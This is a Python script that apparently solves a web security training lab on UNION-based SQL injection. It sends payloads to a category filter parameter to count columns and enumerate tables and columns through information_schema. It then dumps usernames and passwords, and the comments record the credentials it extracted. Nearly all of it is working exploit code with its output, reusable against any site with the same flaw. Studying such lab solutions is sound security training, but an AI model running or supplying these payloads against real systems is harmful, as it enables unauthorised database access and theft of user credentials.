
import requests as r
from time import sleep

# lab name: SQL injection attack, listing the database contents on non-Oracle databases


link = "" # without the last backslash
vuln_path = "/filter?category=Lifestyle"

def found_columns():
    
    col = 0
    response ="Error"
    payload="\' union select "
    while "Error" in  response : 
        if col == 0:
            payload += "null"
        else:
            payload+=",null"
        finalLink = link+vuln_path+payload + "-- "  
        col+=1
        my_req = r.get(finalLink)
        response = my_req.text
        print(finalLink)
        
        sleep(0.4)

    print("Found {} columns".format(col))
    return col




# number_col = found_columns()  # returns 2 columns

def dump_table():

    payload ="\' union select table_name,null from information_schema.tables --"

    to_send = link+ vuln_path+ payload 
    my_re = r.get(to_send)
    response = my_re.text

    print(response)


# dump_table()

# there is one table name which seem pretty interesting : users_pbdypl 




# this table may change for you since it seems that it's generate a new name of table and columns at each instance

def dump_columns():
    
    payload ="\' union select column_name,null from information_schema.columns where table_name=\'users_pbdypl\' --"

    to_send = link+ vuln_path+ payload 
    my_re = r.get(to_send)
    response = my_re.text

    print(response)

# dump_columns()

# returns two columns password_oxghqp and username_hklupu




# If you want to use this script you need to use the table name and column name that you found 

def dump_info():
    
    payload ="\' union select username_hklupu || \'-\' || password_oxghqp,null  from users_pbdypl  --"

    to_send = link+ vuln_path+ payload 
    my_re = r.get(to_send)
    response = my_re.text

    print(response)

dump_info()


# print: 
# wiener-m4yo5rq2fqkk7870hf9o
#  administrator-fo75hrrlhvugpziigr4
# carlos-s2fcybfqwaloatmywwzv